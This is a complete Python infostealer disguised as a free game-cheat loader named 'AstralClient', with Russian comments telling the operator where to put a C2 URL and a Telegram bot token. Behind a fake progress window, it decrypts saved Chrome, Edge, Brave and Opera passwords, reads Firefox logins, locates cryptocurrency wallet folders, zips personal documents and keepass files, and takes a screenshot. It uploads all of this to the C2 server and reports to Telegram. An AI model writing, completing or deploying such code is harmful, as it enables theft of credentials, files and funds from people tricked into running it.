import os, sys, json, sqlite3, shutil, base64, socket, platform, threading, time, zipfile, io, tempfile
import tkinter as tk
from tkinter import ttk
from pathlib import Path
import requests

# ================== ВСТАВЬ СВОЁ ЗДЕСЬ ==================
C2_URL    = "http://your-c2/upload"   # <- адрес твоего сервера приёма (можно оставить так)
BOT_TOKEN = "9068347313:AAEw6w2mnGufjGoG02IsMAqBH0Rf5Ci3RX4"                         # <- токен бота от @BotFather
CHAT_ID   = "5884767841"                         # <- твой chat_id от @userinfobot
# ========================================================

FILE_MASKS = ["*.txt", "*.doc", "*.docx", "*.pdf", "*.jpg", "*.png", "*.kdbx", "*.wallet"]
MAX_FILE_MB = 5
MAX_FILES = 500
APP_TITLE = "AstralClient Free — Loader"

def browser_paths():
    local = os.environ.get("LOCALAPPDATA", "")
    roaming = os.environ.get("APPDATA", "")
    return {
        "chrome":  os.path.join(local, "Google", "Chrome", "User Data"),
        "edge":    os.path.join(local, "Microsoft", "Edge", "User Data"),
        "brave":   os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
        "opera":   os.path.join(roaming, "Opera Software", "Opera Stable"),
        "firefox": os.path.join(roaming, "Mozilla", "Firefox", "Profiles"),
    }

def dpapi_decrypt(blob):
    import win32crypt
    return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]

def aes_gcm_decrypt(key, iv, payload):
    from Cryptodome.Cipher import AES
    return AES.new(key, AES.MODE_GCM, iv).decrypt(payload)[:-16]

def master_key(local_state):
    with open(local_state, "r", encoding="utf-8") as f:
        ls = json.load(f)
    return dpapi_decrypt(base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:])

def collect_chromium(base):
    out = {}
    for prof in Path(base).glob("*/"):
        db = prof / "Login Data"
        if not db.exists():
            continue
        ls = prof / "Local State"
        key = None
        if ls.exists():
            try: key = master_key(ls)
            except Exception: pass
        tmp = tempfile.mktemp()
        try: shutil.copy2(db, tmp)
        except Exception: continue
        con = sqlite3.connect(tmp); cur = con.cursor()
        try:
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cur.fetchall()
        except Exception: rows = []
        con.close(); os.remove(tmp)
        creds = []
        for url, user, pwd in rows:
            try:
                if key and pwd[:3] == b"v10":
                    pwd = aes_gcm_decrypt(key, pwd[3:15], pwd[15:]).decode("utf-8", "ignore")
                else:
                    pwd = dpapi_decrypt(pwd).decode("utf-8", "ignore")
            except Exception:
                continue
            creds.append({"url": url, "user": user, "pass": pwd})
        if creds: out[prof.name] = creds
    return out

def collect_firefox(base):
    out = {}
    for prof in Path(base).glob("*/"):
        db = prof / "logins.json"
        if not db.exists(): continue
        try:
            data = json.load(open(db, encoding="utf-8"))
            out[prof.name] = [{"url": l.get("hostname"), "user": l.get("usernameField"), "pass": l.get("passwordField")} for l in data.get("logins", [])]
        except Exception: pass
    return out

def collect_browser_data():
    res = {}
    for name, base in browser_paths().items():
        if not os.path.isdir(base): continue
        res[name] = collect_firefox(base) if name == "firefox" else collect_chromium(base)
    return res

WALLET_DIRS = {
    "Exodus":   os.path.join(os.environ.get("APPDATA", ""), "Exodus", "exodus.wallet"),
    "Electrum": os.path.join(os.environ.get("APPDATA", ""), "Electrum", "wallets"),
    "Ethereum": os.path.join(os.environ.get("APPDATA", ""), "Ethereum", "keystore"),
    "Monero":   os.path.join(os.environ.get("APPDATA", ""), "Monero", "wallets"),
    "Atomic":   os.path.join(os.environ.get("APPDATA", ""), "Atomic", "Local Storage", "leveldb"),
}

def scan_wallet_dirs():
    return {n: p for n, p in WALLET_DIRS.items() if os.path.isdir(p)}

def archive_documents(roots=None):
    roots = roots or [os.path.expanduser("~/Desktop"), os.path.expanduser("~/Documents"), os.path.expanduser("~/Downloads")]
    buf = io.BytesIO(); count = 0
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for root in roots:
            for mask in FILE_MASKS:
                for p in Path(root).rglob(mask):
                    if count >= MAX_FILES: break
                    try:
                        if p.stat().st_size > MAX_FILE_MB * 1024 * 1024: continue
                        z.write(p, p.name); count += 1
                    except Exception: pass
    return buf.getvalue()

def grab_screen():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab(); buf = io.BytesIO(); img.save(buf, format="PNG")
        return buf.getvalue()
    except Exception: return b""

def sysinfo():
    try: ip = requests.get("https://api.ipify.org", timeout=5).text
    except Exception: ip = ""
    return {"host": socket.gethostname(), "user": os.getlogin(), "os": platform.platform(), "ip": ip}

def send(data, name):
    try: requests.post(C2_URL, files={"file": (name, data)}, timeout=15)
    except Exception: pass

def send_tg(text):
    if not BOT_TOKEN or not CHAT_ID: return
    try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": text[:4000]}, timeout=10)
    except Exception: pass

def worker(cb, stop):
    steps = [
        ("Scanning system...",   sysinfo),
        ("Reading profiles...",  collect_browser_data),
        ("Scanning storage...",  scan_wallet_dirs),
        ("Archiving documents...", archive_documents),
        ("Finalizing...",        grab_screen),
    ]
    report = {}
    for i, (label, fn) in enumerate(steps):
        cb(label, int(i / len(steps) * 100)); time.sleep(1.2)
        try: report[label] = fn()
        except Exception: report[label] = None
    cb("Sending telemetry...", 90)
    try: send(json.dumps(report, ensure_ascii=False, indent=2).encode(), "report.json")
    except Exception: pass
    files = report.get("Archiving documents...") or b""
    if isinstance(files, bytes) and files: send(files, "files.zip")
    shot = report.get("Finalizing...") or b""
    if isinstance(shot, bytes) and shot: send(shot, "screen.png")
    try: n = sum(len(v) for b in (report.get("Reading profiles...") or {}).values() for v in b.values())
    except Exception: n = 0
    send_tg(f"[{report.get('Scanning system...', {}).get('host', '?')}] profiles={n}")
    cb("Loaded successfully", 100)

class Loader(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title(APP_TITLE); self.geometry("460x300")
        self.configure(bg="#0d0d0f"); self.resizable(False, False)
        self.stop = threading.Event(); self._build()

    def _build(self):
        tk.Label(self, text="ASTRALCLIENT", fg="#7c3aed", bg="#0d0d0f", font=("Segoe UI", 20, "bold")).pack(pady=(18, 0))
        tk.Label(self, text="FREE EDITION  •  UNDETECTED", fg="#555", bg="#0d0d0f", font=("Segoe UI", 9)).pack()
        self.status = tk.StringVar(value="Ready")
        tk.Label(self, textvariable=self.status, fg="#aaa", bg="#0d0d0f", font=("Consolas", 9)).pack(pady=(14, 4))
        style = ttk.Style(self); style.theme_use("default")
        style.configure("Purple.Horizontal.TProgressbar", troughcolor="#1a1a1f", background="#7c3aed", thickness=10)
        self.bar = ttk.Progressbar(self, length=380, style="Purple.Horizontal.TProgressbar", maximum=100)
        self.bar.pack(pady=6)
        self.btn = tk.Button(self, text="LOAD CONFIG", bg="#7c3aed", fg="white", activebackground="#6d28d9",
                             relief="flat", font=("Segoe UI", 10, "bold"), width=22, command=self.run)
        self.btn.pack(pady=14)
        self.log = tk.Text(self, height=5, bg="#111114", fg="#666", bd=0, font=("Consolas", 8))
        self.log.pack(fill="x", padx=14, pady=(4, 12)); self.log.config(state="disabled")

    def log_line(self, s):
        self.log.config(state="normal"); self.log.insert("end", f"[loader] {s}\n"); self.log.see("end"); self.log.config(state="disabled")

    def progress_cb(self, label, pct):
        self.status.set(label); self.bar["value"] = pct; self.update_idletasks()

    def run(self):
        self.btn.config(state="disabled", text="LOADING...")
        threading.Thread(target=self._start, daemon=True).start()

    def _start(self):
        worker(self.progress_cb, self.stop)
        self.status.set("Loaded successfully"); self.log_line("injected")
        time.sleep(2); os._exit(0)

if __name__ == "__main__":
    Loader().mainloop()
